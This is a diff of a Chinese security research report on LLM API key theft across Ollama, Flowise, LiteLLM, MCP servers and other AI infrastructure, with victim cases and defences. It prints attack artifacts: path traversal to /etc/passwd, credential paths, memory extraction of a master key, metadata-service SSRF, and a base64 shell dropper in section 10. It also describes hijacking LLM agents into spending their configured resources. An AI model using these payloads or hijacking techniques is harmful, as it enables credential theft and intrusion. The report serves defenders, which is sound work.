@@ -137,15 +137,18 @@ FOFA 的数字是单平台口径，需要独立数据源交叉验证。绿盟科
 
 ---
 
-## 一、威胁模型：为什么 API Key 是新的高价值目标 {:#ch01}
+## 一、威胁模型：为什么 API Key 是新的高价值目标
+{: #ch01}
 
-### 1.1 Key 是机器身份，不适用密码的防护假设 {:#ch01-1}
+### 1.1 Key 是机器身份，不适用密码的防护假设
+{: #ch01-1}
 
 密码的安全模型建立在"使用者是人"的假设上：人会忘记，所以有重置流程；人会泄露，所以有定期轮换；人有行为特征，所以有异常登录检测。API Key 的安全模型没有这些假设。Key 是给程序用的：配置一次长期有效、以明文形式存在于配置文件和环境变量里、调用时无任何行为特征可供画像。
 
 两者的差异在失窃后最为明显。密码失窃，攻击者还要过第二因子、过设备指纹、过异地登录风控。Key 失窃，攻击者直接持有一个完整的合法身份。所有大模型供应商的 SDK 里，Key 的语义就是记账凭证：请求头带上 Key，账单记在 Key 所属账户上。偷到一把 OpenAI 的 `sk-proj-` 前缀的 Key，攻击者不需要任何后续步骤，直接调用，成本由被偷方承担。
 
-### 1.2 失效机制：99.5% 的泄露 Key 会自动死亡，但这不构成安慰 {:#ch01-2}
+### 1.2 失效机制：99.5% 的泄露 Key 会自动死亡，但这不构成安慰
+{: #ch01-2}
 
 Intezer 和 Unit 42 用 YARA 规则在 VirusTotal 语料里狩猎出 647 个泄露的唯一大模型 Key（Android APK 样本占 62%，其中最多的是 Gemini Key），验证方法是发轻量 GET 请求，不发提示词。结果：**99.5% 已失效**。
 
@@ -153,7 +156,8 @@ Intezer 和 Unit 42 用 YARA 规则在 VirusTotal 语料里狩猎出 647 个泄�
 
 供应商的自动撤销之外，企业侧的轮换治理基本失灵。GitGuardian 在[《2026 秘密蔓延状态报告》](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/)里追踪 2022 年泄露且确认有效的秘密，2026 年 1 月复测时仍有 64% 未被撤销；Mandiant 在 2025 年末的真实入侵响应里，确认攻击者使用的正是 2022 年某密码管理器事件中泄露的 AWS Key。三年前的凭据，今天还能进门。
 
-### 1.3 判断：藏得深不属于防御 {:#ch01-3}
+### 1.3 判断：藏得深不属于防御
+{: #ch01-3}
 
 攻击者获取 Key 路径知识的方式是读源码。官方 SDK、开源网关、开源平台的代码全部公开，Key 的存储位置、加载方式、内存形态都是白盒。防御者把 Key 藏进 `.env`、藏进环境变量、藏进 Vault，防的是"顺手翻文件的低能力攻击者"，对读过源码的攻击者无效，因为他比运维更清楚这个框架的 Key 在哪。
 
@@ -161,7 +165,8 @@ Intezer 和 Unit 42 用 YARA 规则在 VirusTotal 语料里狩猎出 647 个泄�
 
 ---
 
-## 二、攻击者的资源获取模型 {:#ch02}
+## 二、攻击者的资源获取模型
+{: #ch02}
 
 Intezer 把攻击者获取大模型推理能力的途径整理成五条，这张表解释了"为什么偷你的最划算"：
 
@@ -181,7 +186,8 @@ LLMjacking 的经济模型已经黑产化。Sysdig 2024 年的首个实测案例
 
 ---
 
-## 三、目标系统分类：三梯队 {:#ch03}
+## 三、目标系统分类：三梯队
+{: #ch03}
 
 按两个维度给测量表里的系统分类：**Key 密度**（一个实例里存多少把 Key）和**认证强度**（默认配置下陌生人离 Key 有多远）。
 
@@ -195,9 +201,11 @@ LLMjacking 的经济模型已经黑产化。Sysdig 2024 年的首个实测案例
 
 ---
 
-## 四、Ollama：自己不存 Key，却是偷 Key 的最佳入口 {:#ch04}
+## 四、Ollama：自己不存 Key，却是偷 Key 的最佳入口
+{: #ch04}
 
-### 4.1 架构决定了它没有认证 {:#ch04-1}
+### 4.1 架构决定了它没有认证
+{: #ch04-1}
 
 Ollama 的 API 面（`/api/generate`、`/api/chat`、`/api/tags`、`/api/pull`、`/api/delete`）设计上不存在认证：没有 Key 校验中间件，没有用户体系，`OLLAMA_*` 环境变量族里没有一个存密钥。这是产品定位的结果，Ollama 面向的是本机开发者场景，默认绑定 127.0.0.1，认证在这个场景里没有意义。
 
@@ -205,7 +213,8 @@ Ollama 的 API 面（`/api/generate`、`/api/chat`、`/api/tags`、`/api/pull`�
 
 但算力白嫖只是 Ollama 的第一层价值。攻击者真正想要的 Key 不在 Ollama 里，在宿主机上。
 
-### 4.2 Probllama：从无认证端点到 root 级任意文件读 {:#ch04-2}
+### 4.2 Probllama：从无认证端点到 root 级任意文件读
+{: #ch04-2}
 
 CVE-2024-37032（Probllama，Wiz 2024 年 5 月披露，0.1.34 修复）是整条链的桥。`/api/blobs/<digest>` 端点把 digest 参数直接拼进文件路径：
 
@@ -231,7 +240,8 @@ GET /api/blobs/sha256:../../etc/passwd
 
 两个位置值得单独解释。`.bash_history` 是命中率最高的路径：开发者习惯在 shell 里 export Key 再启动服务，这条历史文件就成了明文 Key 的持久化备份，比任何配置文件都稳定，因为它不会随服务重装被清理。`/proc/1/environ` 是容器场景的特例：容器里 PID 1 就是主进程，它的环境变量是 docker-compose 里声明的全部上游 Key，读一个文件等于拿到整个混部栈的凭据清单。
 
-### 4.3 审计脚本的链路设计 {:#ch04-3}
+### 4.3 审计脚本的链路设计
+{: #ch04-3}
 
 这条攻击链的审计实现（`ai_ollama_keyaudit.py`，纯标准库）分五步：
 
@@ -247,21 +257,25 @@ GET /api/blobs/sha256:../../etc/passwd
 
 本机实测（0.30.4）：版本识别正确、模型清单列出、工具调用能力标记正常；穿越判定正确返回"5 种变体均未命中"（已修复），同时报告残余危害：算力白嫖、`/api/delete` 无认证删模型（DoS）、`/api/pull` 从攻击者控制的 registry 拉取恶意 GGUF 模型（模型供应链投毒，等待被加载）。
 
-### 4.4 本章结论 {:#ch04-4}
+### 4.4 本章结论
+{: #ch04-4}
 
 "这台机器跑 Ollama"的安全含义不止于 Ollama 本身。Ollama 是入口，Key 的墙在隔壁。评估一个 Ollama 实例的风险，输入变量不是 Ollama 的版本，是宿主机文件系统上还有什么。**爆炸半径等于宿主机文件系统上的全部凭据。** 防御同理：给 Ollama 加认证解决的是入口问题，混部在旁边的那台网关和那堆 shell 历史，是另一个独立且更严重的问题。
 
 ---
 
-## 五、Flowise：认证模型的条件缺陷与 422 台实测 {:#ch05}
+## 五、Flowise：认证模型的条件缺陷与 422 台实测
+{: #ch05}
 
-### 5.1 认证中间件是条件启用的 {:#ch05-1}
+### 5.1 认证中间件是条件启用的
+{: #ch05-1}
 
 Flowise 是低代码 Agent 平台，docker 一行命令启动，替用户保存各模型供应商的 Key。它的认证模型有一个容易被误解的关键细节，直接看源码行为：**2.x 版本线的认证中间件只在 `FLOWISE_USERNAME` 和 `FLOWISE_PASSWORD` 两个环境变量同时设置时才挂载。** 默认 `docker run flowiseai/flowise` 不带任何变量，中间件不存在，全部 API 匿名可访问。这不是漏洞，是设计：官方文档假设你会自己加认证，默认部署假设你在本机。
 
 实际暴露面里，大量实例就停在这个默认状态。第 5.3 节的实测数据会验证这一点。
 
-### 5.2 拿 Key 的四条路径 {:#ch05-2}
+### 5.2 拿 Key 的四条路径
+{: #ch05-2}
 
 **路径一：CVE-2025-59528，未授权 RCE，CVSS 10.0。** CustomMCP 节点把用户传入的字符串直接交给 `Function()` 构造器执行。影响 3.0.5 及以下。CSA 的研究笔记确认该漏洞处于活跃利用状态，攻击目标就是 LLM provider Key。RCE 之后整个文件系统和数据库都可读。
 
@@ -271,7 +285,8 @@ Flowise 是低代码 Agent 平台，docker 一行命令启动，替用户保存�
 
 **路径四：凭据库。** 2.x 无认证实例的凭据管理 API 全部匿名可访问。响应里有分层：标准组件的 password 类型字段被服务端脱敏，返回 `_FLOWISE_BLANK_` 占位值；自定义组件和非 password 类型字段不做处理，直接返回明文。
 
-### 5.3 422 台公网实例的形态判定 {:#ch05-3}
+### 5.3 422 台公网实例的形态判定
+{: #ch05-3}
 
 审计脚本（`ai_flowise_audit.py`）对 FOFA 宽指纹筛出的 995 个候选逐个探活，确认 422 台 Flowise，命中率 42.4%。对第三方实例只做形态判定：版本号、端点可达性、凭据值的格式特征，不做任何真实调用。这个边界是刻意的，理由在第 1.2 节已经说明：形态判定足以支撑风险结论，真实调用验证不是研究的必要条件。
 
@@ -286,13 +301,15 @@ Flowise 是低代码 Agent 平台，docker 一行命令启动，替用户保存�
 
 **凭据暴露**：凭据库匿名可读 10 台（几乎全部是 2.x 默认配置实例，认证变量从未设置过），chatflows 未认证可读 10 台。共收集 47 条泄露值，其中 39 条是测试占位值（`sk-test`、`_FLOWISE_BLANK_`），**6 条格式与真实 Key 完全吻合**：2 条 OpenAI（`sk-proj-` 前缀、164 字符）、2 条 Anthropic（`sk-ant-api03-` 前缀、108 字符）、2 条 PostgreSQL 密码（24 位随机串）。来源是两台 2.2.8 版本的生产配置实例，OpenAI、Anthropic、Postgres 三件套齐全。测试值不会以真实 Key 的格式出现，这 6 条是认真搭建的生产系统。
 
-### 5.4 前人的痕迹 {:#ch05-4}
+### 5.4 前人的痕迹
+{: #ch05-4}
 
 IP `161.35.216.80` 的实例上存在两个命名异常的 chatflow：`HERMES_RCE_v2` 和 `HERMES_RCE_Agent`。这不是管理员给业务流程起的名字，是攻击者验证 RCE 成功后随手创建的测试 flow。
 
 同类证据在 Intezer 的扫描里也有：LocalAI 暴露实例中 21% 存在 nuclei 扫描器残留，时间戳集中在 2026 年 3 至 4 月。两份独立数据指向同一个结论：**暴露的 AI 服务正在被自动化工具常态化打点。** 很多运维的假设是"我这台没人知道，没人来过"，实测答案是有人来过，而且留下了东西。
 
-### 5.5 脚本的证据链设计 {:#ch05-5}
+### 5.5 脚本的证据链设计
+{: #ch05-5}
 
 Ollama 审计和 Flowise 审计的取证思路不同。Ollama 的链是"漏洞到文件到 Key"，脚本顺着漏洞走；Flowise 的链是"未授权端点到凭据存储"，脚本顺着端点走。四条路径各出各的证据：
 
@@ -305,11 +322,13 @@ Ollama 审计和 Flowise 审计的取证思路不同。Ollama 的链是"漏洞�
 
 ---
 
-## 六、实际受害案例：暴露的代价 {:#ch06}
+## 六、实际受害案例：暴露的代价
+{: #ch06}
 
 前面五章讲的是攻击面和手法，这一章讲已经发生的事。案例分三类：企业自建智能应用直接暴露公网、跑 AI 应用的机器被实际控制、开发侧的 Key 批量泄露。其中既有我们自己动手验证的发现，也有公开来源可核验的事件。
 
-### 6.1 企业自建智能应用暴露：不只是开源框架的问题 {:#ch06-1}
+### 6.1 企业自建智能应用暴露：不只是开源框架的问题
+{: #ch06-1}
 
 前文的 Flowise、Langflow 是开源框架的默认配置问题，容易被理解成"用开源才有风险"。实际暴露面里更大的一类是**企业自建的智能应用**。
 
@@ -357,7 +376,8 @@ Ollama 审计和 Flowise 审计的取证思路不同。Ollama 的链是"漏洞�
 
 移动端是同类问题的另一个出口。CloudSEK 发现 32 个 Google API Key 硬编码在 22 款 Android 应用里，总安装量 5 亿量级，涉及出行、电商、教育等头部应用。项目启用 Gemini 后这些 Key 能直接认证到 Gemini 端点。PointGuard 记录到的连带损失：一个独立开发者账单 1.54 万美元，一个墨西哥团队 48 小时被刷 8.23 万美元，一家日本公司约 12.8 万美元。iOS 侧的研究结论相同：LLMKeyLens 框架测试的 LLM 应用里近三分之二存在 OpenAI、Gemini 凭据暴露或后端访问机制暴露。
 
-### 6.2 跑 AI 的机器被控制：从白嫖算力到 RAT {:#ch06-2}
+### 6.2 跑 AI 的机器被控制：从白嫖算力到 RAT
+{: #ch06-2}
 
 暴露的 AI 机器不是只被薅算力，被完整控制的案例已经有多个独立来源。
 
@@ -369,7 +389,8 @@ Ollama 审计和 Flowise 审计的取证思路不同。Ollama 的链是"漏洞�
 
 背景数据：SentinelLabs 和 Censys 联合调查确认 17.5 万台暴露 Ollama 覆盖 130 个国家、4032 个 ASN，其中 **48% 支持工具调用**。工具调用能力意味着文本端点等价于代码执行端点，这批实例构成的是一个没人管理的公共 AI 算力层，谁都能用，谁都不看。中国电信云堤·广目对大模型服务主机恶意事件的类型统计与这个判断一致：C2 攻击和僵尸网络占主导。暴露的 AI 机器最常见的结局不是被薅一次算力，是被收编进攻击基础设施。
 
-### 6.3 开发侧的 Key 批量泄露 {:#ch06-3}
+### 6.3 开发侧的 Key 批量泄露
+{: #ch06-3}
 
 企业和个人的 Key 还在通过开发链路批量流入公开渠道。Cyble 和 Vicarius 的统计：**8,000 多个 ChatGPT API Key 暴露在 5,000 多个 GitHub 仓库和 3,000 多个活跃网站上**，AI 辅助编码工具的普及让"密钥被写进代码再提交"的模式显著增多。JetBrains Marketplace 上 15 个伪装成 DeepSeek、OpenAI、SiliconFlow 助手的恶意插件潜伏了约 8 个月，累计 7 万次安装，持续窃取开发者的 OpenAI、Anthropic、DeepSeek 密钥。还有一个容易被忽略的新载体：公开分享的 Agent 轨迹数据集和会话日志。开发者以为只分享了"调用的过程"，实际上把凭证也分享了出去，本节末尾的 ELLIS 研究给出完整机制和数字。
 
@@ -403,11 +424,13 @@ Ollama 审计和 Flowise 审计的取证思路不同。Ollama 的链是"漏洞�
 
 ---
 
-## 七、网关层：Key 密度最高的目标 {:#ch07}
+## 七、网关层：Key 密度最高的目标
+{: #ch07}
 
 "网关层是攻击者首选"这个判断有独立数据源佐证。中国电信云堤·广目统计的大模型服务主机恶意事件分布里，LiteLLM 占 47.03% 位居首位，LocalAI 占 16.83%；而暴露量占 87.17% 的 Ollama，恶意事件占比反而不高。使用量与受害量的倒挂指向同一个事实：攻击者扫遍整个暴露面，下手集中在持有上游 Key 的网关上，纯本地推理、不存 Key 的实例只是顺手的算力，网关才是钱袋子。
 
-### 7.1 One API / New API：渠道即 Key 清单 {:#ch07-1}
+### 7.1 One API / New API：渠道即 Key 清单
+{: #ch07-1}
 
 One API 是国内生态的元老项目，New API 是它的活跃分支，渠道体系同源。渠道（channel）是管理员配置的上游连接：接一家 OpenAI 官方或中转商，就建一条渠道，填入上游 secret key，分配模型和分组。渠道的本质是**上游 Key 的存储位**，数据库 channels 表，admin 后台的「渠道」页就是全部上游 Key 的明文清单。
 
@@ -421,7 +444,8 @@ One API 是国内生态的元老项目，New API 是它的活跃分支，渠道�
 
 这类系统的根本问题是**渠道的权限边界设计**：渠道本该是 admin 独占的资源，但在调用链上被当成了一个可寻址的普通参数，URL 里的一个整数。第 5 章 Flowise 的问题是"认证不存在"，这里的问题是"认证存在但边界画错了位置"。
 
-### 7.2 LiteLLM：全链条风险样本 {:#ch07-2}
+### 7.2 LiteLLM：全链条风险样本
+{: #ch07-2}
 
 LiteLLM 值得完整分析，因为它是"风险集中模式"的教科书：proxy 部署把所有上游 Key 汇进一个进程，而它的漏洞链覆盖了从认证绕过到供应链的每个环节。
 
@@ -454,15 +478,18 @@ print('master_key:', getattr(ps, 'master_key', None))"
 
 从进程内存里把 master key 读出来。这一条对"密钥管理靠加密软件"的思路是降维打击：落盘加密保护的是磁盘上的数据，这条路的数据根本没经过磁盘。外部研究者已将 Qilin 勒索组织与 CVE-2026-42271 加 CVE-2026-48710（Starlette Host 头校验绕过）组合成的完全未认证 RCE 链的活跃利用关联。
 
-### 7.3 Open WebUI：面板即清单 {:#ch07-3}
+### 7.3 Open WebUI：面板即清单
+{: #ch07-3}
 
 Open WebUI 是给 Ollama 和其他推理后端配的管理面板，宽口径暴露 177,279 个。进入路径：无认证部署，或老版本的缺陷逻辑：首个注册用户自动成为 admin。admin 的「外部连接」页配置上游 OpenAI 兼容 API，就是 Key 的存储位置。这批暴露量里相当比例是家庭和个人部署，Key 是个人的 OpenAI Key，但企业内同样存在部门自建实例，威胁模型和 Flowise 一致。
 
 ---
 
-## 八、Agent 平台层：RCE 高发区 {:#ch08}
+## 八、Agent 平台层：RCE 高发区
+{: #ch08}
 
-### 8.1 Langflow：一年四个 KEV，全部未授权 RCE {:#ch08-1}
+### 8.1 Langflow：一年四个 KEV，全部未授权 RCE
+{: #ch08-1}
 
 - CVE-2025-3248：`/api/v1/validate/code` 端点对用户提交的代码执行 `exec()`，未认证可达
 - CVE-2026-33017：`/build_public_tmp` 端点任意文件写入，披露后 20 小时被利用来偷 AWS Key
@@ -471,11 +498,13 @@ Open WebUI 是给 Ollama 和其他推理后端配的管理面板，宽口径暴�
 
 Intezer 对确认主机的扫描结果是：**全部**易受 CVE-2026-33017，72% 同时带 CVE-2025-3248。Key 在 `.env` 和 flow 配置里，RCE 即全拿。较严口径 43,380 台的暴露量，配合这个漏洞覆盖率，"4.3 万暴露约等于 4.3 万可用入口"不是修辞。
 
-### 8.2 n8n：加密了，但钥匙和密文在同一个抽屉 {:#ch08-2}
+### 8.2 n8n：加密了，但钥匙和密文在同一个抽屉
+{: #ch08-2}
 
 n8n 默认强制用户管理，认证在这批平台里最严。但 CVE-2026-21858（Ni8mare，CVSS 10.0）用 webhook 端点的内容类型混淆把它变成了未认证 RCE。凭据存储用 `N8N_ENCRYPTION_KEY` 加密，设计上没问题，问题在部署：这个加密 Key 就写在 `.env` 里，docker-compose 部署下经常和数据库一起整体暴露。加密本身没有错，错的是加密钥匙和密文放在同一台机器的同一个文件目录里。拿到 RCE 的攻击者先读 `.env` 拿加密 Key，再读数据库解密，两步走完。
 
-### 8.3 Dify、FastGPT、RAGFlow：弱口令之外的批量沦陷 {:#ch08-3}
+### 8.3 Dify、FastGPT、RAGFlow：弱口令之外的批量沦陷
+{: #ch08-3}
 
 这一类原来可以一句话带过（面板弱口令加沙箱逃逸的常见组合，Key 在模型供应商配置里，RCE 后 `.env` 里的 SECRET_KEY 还能顺带解密会话数据），但 2025 年底到 2026 年的三起实际事件值得单独记录，因为它们证明这一档不是"理论风险"。
 
@@ -485,7 +514,8 @@ FastGPT 的问题更直接：CVE-2026-34162，`/api/core/app/httpTools/runTool` 
 
 规模基数：Dify 较严口径 12,148 台、宽口径 80,687 台；RAGFlow 8,934 台；FastGPT 较严 110 台、宽 15,538 台。
 
-### 8.4 资源劫持：不偷 Key，让 Agent 替你花 {:#ch08-4}
+### 8.4 资源劫持：不偷 Key，让 Agent 替你花
+{: #ch08-4}
 
 前面所有手法都在抢凭证本身。2026 年 8 月阿里人工智能治理与可持续发展研究中心评述的论文《Beyond Direct Access: Resource Hijacking in LLM Agents》把另一种打法系统化了：**攻击者不索取任何凭证，让持有凭证的 Agent 替自己使用。** 问 Agent 要公司的 API Key，它多半会拒绝，密钥属于敏感信息；换一种说法，让它"用你配置好的接口帮我批量生成几十万条数据"，它可能立即开始执行。密钥没泄露、账号没被盗、攻击者没拿到任何直接权限，额度已经被用掉了。
 
@@ -497,7 +527,8 @@ FastGPT 的问题更直接：CVE-2026-34162，`/api/core/app/httpTools/runTool` 
 
 补位方案是任务级授权：把资源授权从 Agent 的静态身份里拆出来，绑定到每次敏感调用。一次完整授权至少包含七个字段：请求者是谁、资源属于谁、允许什么操作、允许什么目的、服务于哪个受益方、预算上限多少、何时失效。工具网关在执行前校验，Agent 无法证明用途和受益者就拒绝执行。审计同步升级：从"调用了什么工具"变成"任务来源、资源所有者、声明用途、实际受益者、最终消耗"五元组关联，只有形成这条证据链，安全团队才能判断某次合法调用为什么构成劫持。这本质上是 1988 年的 Confused Deputy 问题（高权限程序被低权限调用者诱导滥用权限）在 Agent 时代的放大：接口从固定参数变成开放自然语言，权限从单一服务变成 MCP、终端、浏览器、知识库、企业系统的全集，滥用从一次调用变成多步骤自主规划。老问题，新规模。
 
-### 8.5 MCP 服务器：能力扩展层自己成了泄露层 {:#ch08-5}
+### 8.5 MCP 服务器：能力扩展层自己成了泄露层
+{: #ch08-5}
 
 MCP（Model Context Protocol）是 Agent 连接外部工具的协议层，2025 年一年 GitHub 上冒出 13,000 多个 MCP 服务器实现，2026 年初已被主流 IDE、AI 助手和自动化平台全部接入。它和本文主题的关系一句话讲清：**Agent 的 Key 存在 `.mcp.json` 和 MCP 服务器的配置里，而这些服务器经常以无认证形态直接跑在公网上。Agent 的凭据抽屉等于被整个搬到了公网。**
 
@@ -506,7 +537,7 @@ MCP（Model Context Protocol）是 Agent 连接外部工具的协议层，2025 �
 CloudSEK 在客户环境里实测到的利用链，把"无认证 MCP"到"云凭据泄露"的距离量了出来，四步：
 
 1. **无认证枚举。** initialize、tools/list、tools/call 全部不要求凭证，攻击者先把服务器注册的工具、资源、提示词摸了个遍，拿到目标 AI 系统能力的完整作战地图。
-2. **SSRF。** 一个音频下载工具按设计接受任意 URL 做代理，没有域名校验。把 URL 换成 AWS 元数据服务地址（http://169.254.169.254/），服务器替攻击者发起请求，返回的是活跃的 AWS IAM 角色凭据。
+2. **SSRF。** 一个音频下载工具按设计接受任意 URL 做代理，没有域名校验。把 URL 换成 AWS 元数据服务地址（[http://169.254.169.254/）](http://169.254.169.254/）)，服务器替攻击者发起请求，返回的是活跃的 AWS IAM 角色凭据。
 3. **LFI。** 同一个代理端点不限制 `file://` 协议，`url=file:///proc/self/environ` 直接读进程环境变量，明文数据库密码就在里面。
 4. **影响叠加。** IAM 凭据横向打进云环境；数据库凭据配上同服务器上暴露的语音通话、短信调度工具，通话记录和号码元数据这类 PII 也在射程内。
 
@@ -522,7 +553,8 @@ CloudSEK 在客户环境里实测到的利用链，把"无认证 MCP"到"云凭�
 
 ---
 
-## 九、开发环境层：公开研究的空白区 {:#ch09}
+## 九、开发环境层：公开研究的空白区
+{: #ch09}
 
 code-server 宽口径 62,417 个，Jupyter 63,047 个。这批实例里相当数量是 `auth: none` 或空 token 直接暴露公网，进去就是一个 web 终端加文件管理器。这里躺的是个人身份的 AI CLI 凭据，路径固定且全部公开：
 
@@ -540,7 +572,8 @@ agentleaks 项目把这些路径整理成了公开清单。间接证据说明这
 
 ---
 
-## 十、攻击路径归纳 {:#ch10}
+## 十、攻击路径归纳
+{: #ch10}
 
 把前文的进入手法拆散重组，攻击者获取大模型 Key 与资源的路径收敛为八条：
 
@@ -569,7 +602,8 @@ echo ZWNobyBsd2hmdyAyPiYxO2NobW9kIDc3NyAvdmFyL3RtcC9kb2NrZXIgMj4mMTtlY2hvIGtmOWV
 
 ---
 
-## 十一、自查方法论 {:#ch11}
+## 十一、自查方法论
+{: #ch11}
 
 想知道自己网段里有多少东西裸奔，照攻击者的摸法摸一遍。分两层。
 
@@ -594,7 +628,8 @@ echo ZWNobyBsd2hmdyAyPiYxO2NobW9kIDc3NyAvdmFyL3RtcC9kb2NrZXIgMj4mMTtlY2hvIGtmOWV
 
 ---
 
-## 十二、防御体系：分层与卡点 {:#ch12}
+## 十二、防御体系：分层与卡点
+{: #ch12}
 
 不讲最佳实践清单，讲八条我们认为最难也最有用的，把落地卡点摊开。
 
@@ -648,7 +683,8 @@ echo ZWNobyBsd2hmdyAyPiYxO2NobW9kIDc3NyAvdmFyL3RtcC9kb2NrZXIgMj4mMTtlY2hvIGtmOWV
 
 ---
 
-## 十三、结语 {:#ch13}
+## 十三、结语
+{: #ch13}
 
 Intezer 报告里有一句值得原样引用："AI 是现代的决定性技术……但大模型服务器仍然是运行在主机上的服务，它监听端口、使用协议通信，并且有攻击面。"
 
@@ -662,60 +698,61 @@ Intezer 报告里有一句值得原样引用："AI 是现代的决定性技术�
 
 ---
 
-## 附录：参考来源 {:#ch14}
+## 附录：参考来源
+{: #ch14}
 
-- Intezer / Unit 42《How attackers are gaining access to LLM inference》：https://mp.weixin.qq.com/s/i8Es0ozycTpmDWtVydXaeA
-- KB Agent《环境变量里的 Key》防御实践：https://mp.weixin.qq.com/s/93RFPf1ye9hij_paKylg8g
-- 信安笔录《Agent 系统打点实录》：https://mp.weixin.qq.com/s/zo7vkvlvh6H_SvATtS5c4g
-- Wiz《Inside 90 days of attacks on AI infrastructure》：https://www.wiz.io/blog/ai-infrastructure-honeypot
-- Wiz Probllama（CVE-2024-37032）：https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
-- Sysdig《LLMjacking evolved》：https://www.sysdig.com/blog/llmjacking-evolved-attackers-are-using-stolen-ai-compute-to-build-offensive-agentic-tools
-- CSA Flowise CVE-2025-59528 研究笔记：https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/04/CSA_research_note_flowise_cve_2025_59528_active_exploitation_20260407-csa-styled.pdf
-- Flowise GHSA-6pcv-j4jx-m4vx：https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6pcv-j4jx-m4vx
-- SentinelOne CVE-2026-41279：https://www.sentinelone.com/vulnerability-database/cve-2026-41279/
-- VulnCheck CVE-2026-56268：https://www.vulncheck.com/advisories/flowise-cross-workspace-information-disclosure-via-chatflows-apikey-endpoint
-- CloudSEK / Hudson Rock LiteLLM 供应链（2,500 组织）：https://thehackernews.com/2026/08/malicious-litellm-releases-tied-to.html
-- One API issue #2410 / #2423 / #2425：https://github.com/songquanpeng/one-api/issues/2410
-- Wiz《State of AI in the Cloud 2026》：https://www.wiz.io/reports/state-of-ai-in-the-cloud-2026
-- agentleaks（AI CLI 密钥路径清单）：https://github.com/Thomas-E-Lewis/agentleaks
-- SentinelLabs / Censys 175k Ollama：https://thehackernews.com/2026/01/researchers-find-175000-publicly.html
-- JetBrains 恶意插件：https://vpncentral.com/malicious-jetbrains-plugins-stole-openai-deepseek-and-siliconflow-api-keys/
-- Wiz Moltbook 数据库暴露（150 万 API Key）：https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys
-- Wiz DeepSeek ClickHouse 暴露：https://cybernoz.com/wiz-research-uncovers-exposed-deepseek-database-leaking-sensitive-information-including-chat-history/
-- CloudSEK Android 硬编码 Gemini Key（5 亿安装量级）：https://www.pointguardai.com/ai-security-incidents/hardcoded-android-keys-opened-gemini-to-anyone-on-the-wire
-- Akamai Ollama P2P 挖矿与远控取证：https://www.akamai.com/blog/security-research/stealthy-p2p-cryptominer-ollama-endpoints
-- 奇安信 XLab NadMesh 僵尸网络（3,811 个 AWS Key）：https://intelligibberish.com/articles/2026-07-19-nadmesh-botnet-exposed-ai-services-cloud-keys/
-- Pillar Security Operation Bizarre Bazaar（35,000 攻击会话）：https://www.pillar.security/blog/operation-bizarre-bazaar-first-attributed-llmjacking-campaign-with-commercial-marketplace-monetization
-- CSA《LiteLLM CVE-2026-42208：AI 代理预认证 SQL 注入》（36 小时在野利用、17 个 UNION 载荷、三张凭据表）：https://labs.cloudsecurityalliance.org/research/csa-research-note-litellm-cve-2026-42208-ai-proxy-sqli-20260/
-- CSA《LLMjacking：AI 模型劫持达到黑市规模》（Sysdig 日账单数据聚合）：https://labs.cloudsecurityalliance.org/research/csa-research-note-llmjacking-black-market-ai-model-hijacking/
-- GitHub 秘密暴露规模（2024 年 3,900 万个、新提交 Key 平均 4 分钟被发现）：https://beyondscale.tech/blog/llmjacking-defense-guide
-- GitGuardian《State of Secrets Sprawl 2026》（2,865 万新秘密、AI 服务凭据 +81%、MCP 配置 24,008 个秘密、64% 未撤销、Shai-Hulud 2 数据集 6,943 台机器）：https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/
-- Verizon《2026 数据泄露调查报告》（DBIR，AI 使用率 15%→45%、67% 个人账号、Shadow AI 第三位）：https://www.verizon.com/business/resources/reports/dbir/
-- GitGuardian 对 Verizon 2026 DBIR 的凭据视角解读（Shadow AI、非人类身份、第三方涉及占比 48%）：https://blog.gitguardian.com/initial-access-changed-the-attack-path-did-not-findinds-from-the-verizon-2026-dbir/
-- Google Cloud《Cloud Threat Horizons H1 2026》（身份失陷 83%、被盗凭据 21%、披露到利用压缩到天级）：https://services.google.com/fh/files/misc/cloud_threat_horizons_report_h12026.pdf
-- ELLIS 研究所/马普所《Stealing Reasoning Traces from Proprietary LLM APIs》（arXiv:2608.09867）：https://arxiv.org/abs/2608.09867
-- Matthew Green《Fooling Around with Encrypted Reasoning Blobs》（2026-05-29 早期披露）：https://blog.cryptographyengineering.com/2026/05/29/fooling-around-with-encrypted-reasoning-blobs/
-- Cyble / Vicarius 8,000+ ChatGPT Key 暴露统计：https://www.elegantsoftwaresolutions.com/blog/vibe-coder-security-2026-06-05
-- 阿里人工智能治理研究中心《Agent 资源劫持攻击》：https://hub.baai.ac.cn/view/57527
-- Beyond Direct Access: Resource Hijacking in LLM Agents（arXiv 2608.15108）：https://arxiv.org/pdf/2608.15108
-- 腾讯云开发者社区《DeepSeek API Key 泄露一夜烧掉 5000 块》：https://developer.cloud.tencent.com/article/2716630
-- 阿里云开发者社区《单日异常消耗 3.2 万美金：AI 调用治理复盘》：https://developer.aliyun.com/article/1738003
-- 火山引擎《GitHub 公开仓库 API Key 泄露遭滥用，是否属平台安全漏洞》：https://www.volcengine.com/article/271095
-- Ant Design X 文档密钥泄露 issue #831：https://github.com/ant-design/x/issues/831
-- 中国电信云堤·广目《大模型软件公网暴露测绘报告》：https://zhuanlan.zhihu.com/p/1890065256010727983
-- AveMujica《当 AI 功能进入真实业务：防止生产环境大模型 API Key 泄露》：https://api.avemujica.moe/blog/zh/prevent-llm-api-key-leaks
-- CloudSEK AIVigil《无认证 MCP 服务器到 AWS 凭据窃取的完整链》：https://www.cloudsek.com/blog/aivigil-mcp-security-case-study
-- 假 Claude Code 安装器钓鱼战役（Google Sites × 32）：https://dailysecurityreview.com/phishing/fake-claude-code-installers-on-google-sites-steal-ai-api-keys/
-- Slopsquatting（AI 幻觉包名抢注）：https://shshell.com/blog/slopsquatting-ai-supply-chain-attack
-- CSA《Mini Shai-Hulud：TeamPCP 多生态包注册表协同攻击》：https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/05/CSA_research_note_teampcp_mini_shai_hulud_package_registry_wave_20260502-csa-styled.pdf
-- MCP 生态安全状态统计（暴露的 Anthropic Key 与聊天记录）：https://nimblebrain.ai/blog/state-of-mcp-security-2026/
-- OpenClaw 第三方客户端 150 万 API Key 泄露：https://mcp.csdn.net/6a7c250f662f9a54cb9b9a42.html
-- MCP 服务器 URL 拼接类 token 泄露缺陷：https://dev.to/correctover/an-mcp-server-leaked-api-tokens-through-url-concatenation-heres-the-class-of-bug-behind-it-4p76
